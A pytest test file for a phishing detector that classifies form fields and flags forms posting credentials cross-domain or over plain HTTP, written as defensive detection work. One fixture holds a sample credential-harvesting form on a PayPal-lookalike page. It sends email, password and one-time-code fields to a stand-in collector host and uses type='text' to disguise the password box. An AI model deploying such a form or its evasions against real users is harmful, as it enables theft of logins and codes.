"""Layer 4c: what a form collects and where it sends it.

These classifications are the ones the decision engine trusts *over* the LLM,
so they need to hold up against the evasions phishing kits actually use -
`type="text"` password boxes, unnamed OTP fields, and so on.
"""

from __future__ import annotations

from detector.form_analyzer import InputField, analyze_form
from detector.html_analyzer import analyze_html


def _form(fields, *, action="https://site.com/submit", page_domain="site.com",
          method="post"):
    return analyze_form(action=action, declared_action=action, method=method,
                        fields=tuple(fields), page_registered_domain=page_domain)


# ---------------------------------------------------------------------------
# field classification
# ---------------------------------------------------------------------------
def test_password_by_input_type():
    assert InputField(input_type="password").is_password is True


def test_password_disguised_as_text_field():
    """Kits use type=text with a telling name to dodge naive type checks."""
    assert InputField(name="pwd", input_type="text").is_password is True
    assert InputField(name="user_password", input_type="text").is_password is True
    assert InputField(field_id="passphrase", input_type="text").is_password is True


def test_password_by_autocomplete_attribute():
    assert InputField(input_type="text", autocomplete="current-password").is_password is True
    assert InputField(input_type="text", autocomplete="new-password").is_password is True


def test_otp_by_name_and_by_shape():
    assert InputField(name="otp").is_otp is True
    assert InputField(name="verification_code").is_otp is True
    assert InputField(input_type="text", autocomplete="one-time-code").is_otp is True
    # Unnamed but unmistakably shaped: 6-digit numeric box.
    assert InputField(name="x", inputmode="numeric", max_length=6).is_otp is True


def test_long_numeric_field_is_not_an_otp():
    assert InputField(name="x", inputmode="numeric", max_length=64).is_otp is False


def test_payment_fields():
    assert InputField(name="card_number").is_payment is True
    assert InputField(name="cvv").is_payment is True
    assert InputField(input_type="text", autocomplete="cc-number").is_payment is True
    assert InputField(name="iban").is_payment is True


def test_seed_phrase_field():
    assert InputField(name="recovery_phrase").is_seed_phrase is True
    assert InputField(name="wallet_seed").is_seed_phrase is True
    assert InputField(placeholder="Enter your 12-word mnemonic").is_seed_phrase is True


def test_identity_fields():
    assert InputField(name="ssn").is_identity is True
    assert InputField(name="date_of_birth").is_identity is True


def test_username_fields():
    assert InputField(input_type="email").is_username is True
    assert InputField(name="username").is_username is True
    assert InputField(name="login_id").is_username is True


def test_ordinary_fields_classify_as_nothing():
    plain = InputField(name="search_query", input_type="text")
    assert plain.is_password is False
    assert plain.is_otp is False
    assert plain.is_payment is False
    assert plain.is_seed_phrase is False


# ---------------------------------------------------------------------------
# form-level signals
# ---------------------------------------------------------------------------
def test_credential_form_detection():
    assert _form([InputField(input_type="password")]).is_credential_form is True
    assert _form([InputField(name="otp")]).is_credential_form is True
    assert _form([InputField(name="cvv")]).is_credential_form is True
    assert _form([InputField(name="q")]).is_credential_form is False


def test_cross_domain_detection_uses_registered_domain():
    same = _form([InputField(input_type="password")],
                 action="https://api.site.com/login", page_domain="site.com")
    assert same.posts_cross_domain is False

    cross = _form([InputField(input_type="password")],
                  action="https://collector.ru/x", page_domain="site.com")
    assert cross.posts_cross_domain is True


def test_cross_domain_is_false_when_either_domain_is_unknown():
    unknown = _form([InputField(input_type="password")], action="", page_domain="site.com")
    assert unknown.posts_cross_domain is False


def test_insecure_submission_flagged():
    insecure = _form([InputField(input_type="password")],
                     action="http://site.com/login", page_domain="site.com")
    assert insecure.submits_insecurely is True

    secure = _form([InputField(input_type="password")],
                   action="https://site.com/login", page_domain="site.com")
    assert secure.submits_insecurely is False


def test_collected_kinds_listed_for_explanations():
    form = _form([
        InputField(input_type="password"),
        InputField(name="otp", max_length=6, inputmode="numeric"),
        InputField(name="card_number"),
    ])
    kinds = form.collected_kinds()
    assert "password" in kinds and "one-time code" in kinds and "payment card" in kinds


def test_describe_is_factual_and_single_line():
    form = _form([InputField(input_type="password")],
                 action="https://collector.ru/x", page_domain="site.com")
    described = form.describe()
    assert "\n" not in described
    assert "CROSS-DOMAIN" in described
    assert "collector.ru" in described


def test_hidden_fields_counted():
    form = _form([
        InputField(name="csrf", hidden=True),
        InputField(name="campaign", input_type="hidden"),
        InputField(input_type="password"),
    ])
    assert form.hidden_field_count == 2


# ---------------------------------------------------------------------------
# realistic end-to-end shapes
# ---------------------------------------------------------------------------
def test_realistic_credential_harvester():
    html = """
    <form action="https://harvest-server.ru/collect.php" method="post">
      <input type="email" name="email" required>
      <input type="text" name="pwd" required>
      <input type="text" name="code" maxlength="6" inputmode="numeric">
      <input type="hidden" name="campaign" value="ppl-2026">
    </form>
    """
    s = analyze_html("https://paypal-secure-login.com/signin", html)
    form = s.forms[0]

    assert form.is_credential_form is True
    assert form.has_password_field is True         # despite type="text"
    assert form.has_otp_field is True
    assert form.posts_cross_domain is True
    assert form.hidden_field_count == 1
    assert s.has_cross_domain_credential_post is True


def test_realistic_legitimate_login():
    html = """
    <form action="/api/session" method="post">
      <input type="email" name="email" autocomplete="username" required>
      <input type="password" name="password" autocomplete="current-password" required>
    </form>
    """
    s = analyze_html("https://app.example.com/login", html)
    form = s.forms[0]

    assert form.is_credential_form is True         # it does collect a password
    assert form.posts_cross_domain is False        # but it keeps it in-house
    assert form.submits_insecurely is False
    assert s.has_cross_domain_credential_post is False
